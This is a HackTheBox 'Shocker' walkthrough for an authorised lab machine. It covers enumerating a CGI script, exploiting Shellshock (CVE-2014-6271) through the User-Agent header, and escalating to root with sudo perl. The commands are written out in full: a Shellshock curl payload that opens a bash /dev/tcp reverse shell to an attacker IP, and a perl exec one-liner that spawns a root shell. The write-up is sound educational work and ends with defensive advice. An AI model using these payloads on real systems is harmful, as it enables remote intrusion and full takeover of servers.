---
title: "HackTheBox: Shocker - Shellshock Exploitation & Perl Sudo Privesc"
date: 2026-02-21
draft: false
description: "Walkthrough of HackTheBox Shocker, exploiting the Shellshock vulnerability (CVE-2014-6271) in a CGI script and escalating to root via sudo perl."
tags: ["hackthebox", "linux", "shellshock", "cgi", "sudo", "privesc"]
---

## Introduction

Shocker is a Linux machine on HackTheBox that teaches the infamous Shellshock vulnerability (CVE-2014-6271). The box name itself is a hint at the attack vector. We'll exploit a vulnerable CGI script to gain initial access, then abuse sudo permissions on Perl to escalate to root.

- **Difficulty:** Easy  
- **OS:** Linux  
- **Skills:** CGI enumeration, Shellshock exploitation, sudo abuse

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap/shocker 10.129.2.16
```

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache 2.4.18 (Ubuntu) |
| 2222 | SSH | OpenSSH 7.2p2 |

Two ports open. SSH on a non-standard port (2222 instead of 22) and Apache web server.

The box is named "Shocker" - this is a strong hint towards **Shellshock** (CVE-2014-6271), a critical vulnerability in bash that affects CGI scripts on web servers.

---

## What is Shellshock?

Shellshock (CVE-2014-6271) is a vulnerability in how bash handles environment variables. When Apache runs CGI scripts, it passes HTTP headers as environment variables. If those variables contain specially crafted function definitions, bash executes arbitrary code after the function.

The payload structure:
```bash
() { :; }; <malicious command>
```

- `() { :; };` - Empty function definition that bash parses
- Everything after gets executed as a command

---

## Enumeration

### Why CGI-BIN?

Since we suspect Shellshock, we need to find CGI scripts. These are typically stored in `/cgi-bin/` and have extensions like `.sh`, `.cgi`, or `.pl`.
```bash
gobuster dir -u http://10.129.2.16/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl -o gobuster.txt
```

**Why these extensions?** Shellshock targets scripts that execute through bash:
- `.sh` - Shell scripts
- `.cgi` - CGI scripts
- `.pl` - Perl scripts (often invoke bash)

Found:
```bash
/user.sh              (Status: 200) [Size: 118]
```

### Verifying the Script
```bash
curl http://10.129.2.16/cgi-bin/user.sh
```
```bash
Content-Type: text/plain
Just an uptime test script
 08:40:51 up 2 min,  0 users,  load average: 0.04, 0.05, 0.02
```

The script executes and returns system uptime. This confirms it's running through bash - a perfect Shellshock target.

---

## Exploitation

### Testing Shellshock
```bash
curl -A "() { :; }; echo; /usr/bin/whoami" http://10.129.2.16/cgi-bin/user.sh
```

**Breaking down the command:**
- `-A` sets the User-Agent header
- Apache passes User-Agent to bash as an environment variable
- `() { :; };` is the Shellshock trigger
- `echo;` outputs a blank line (required for valid HTTP response)
- `/usr/bin/whoami` is our test command

Result:
```bash
shelly
```

We have command execution as user `shelly`.

### Getting a Reverse Shell

**On Kali - Start listener:**
```bash
nc -lvnp 4444
```

**Send the payload:**
```bash
curl -A "() { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.3/4444 0>&1" http://10.129.2.16/cgi-bin/user.sh
```

**Why this payload?** Since bash is executing our commands, we use bash's built-in `/dev/tcp` feature to create a reverse connection. This is more reliable than calling external tools like netcat.

We catch a shell as `shelly`.

---

## Privilege Escalation

### Checking Sudo Permissions

First thing to check on any Linux box:
```bash
sudo -l
```
```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

**Why check sudo -l first?** It's the fastest path to root on many boxes. Misconfigurations here are common and easily exploitable.

### Understanding the Vulnerability

We can run `/usr/bin/perl` as root without a password. Perl can execute system commands, which means we can spawn a root shell.

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo) confirms Perl can be abused for privilege escalation.

### Spawning Root Shell
```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

**Why this works:**
- `sudo /usr/bin/perl` runs Perl as root
- `-e` executes inline code
- `exec "/bin/bash"` replaces the Perl process with bash
- The new bash shell inherits root privileges
```bash
whoami
root
```

---

## Flags
```bash
cat /home/shelly/user.txt
cat /root/root.txt
```

---

## Attack Path Summary
```bash
Nmap (ports 80, 2222)
        │
        ▼
Box name "Shocker" hints at Shellshock
        │
        ▼
Gobuster /cgi-bin/ with .sh,.cgi,.pl extensions
        │
        ▼
Found /cgi-bin/user.sh
        │
        ▼
Tested Shellshock via User-Agent header
        │
        ▼
Reverse shell as shelly
        │
        ▼
sudo -l shows perl runs as root
        │
        ▼
perl -e 'exec "/bin/bash"'
        │
        ▼
ROOT
```

---

## Key Takeaways

### Why This Attack Worked

| Vulnerability | Impact |
|---------------|--------|
| CGI script in `/cgi-bin/` | Accessible shell script on web server |
| Unpatched Shellshock | Remote code execution |
| Sudo misconfiguration | Perl runs as root without password |

### Defensive Measures

| Recommendation | Priority |
|----------------|----------|
| Patch bash (Shellshock fixed in 2014) | Critical |
| Remove unnecessary CGI scripts | High |
| Audit sudo permissions | High |
| Use sudo with specific arguments, not full binary access | Medium |

---

## Lessons Learned

1. **Box names are hints** - "Shocker" pointed directly to Shellshock
2. **Enumerate for CGI scripts** - Always check `/cgi-bin/` with script extensions
3. **Understand your exploits** - Knowing how Shellshock works helps craft payloads
4. **GTFOBins is essential** - Quick reference for sudo binary abuse
5. **sudo -l first** - Often the fastest privilege escalation path

---

## Tools Used

- Nmap
- Gobuster
- cURL
- Netcat

---

## References

- [CVE-2014-6271 - Shellshock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [GTFOBins - Perl](https://gtfobins.github.io/gtfobins/perl/#sudo)

---

*This writeup is for educational purposes. Only test on systems you have permission to access.*
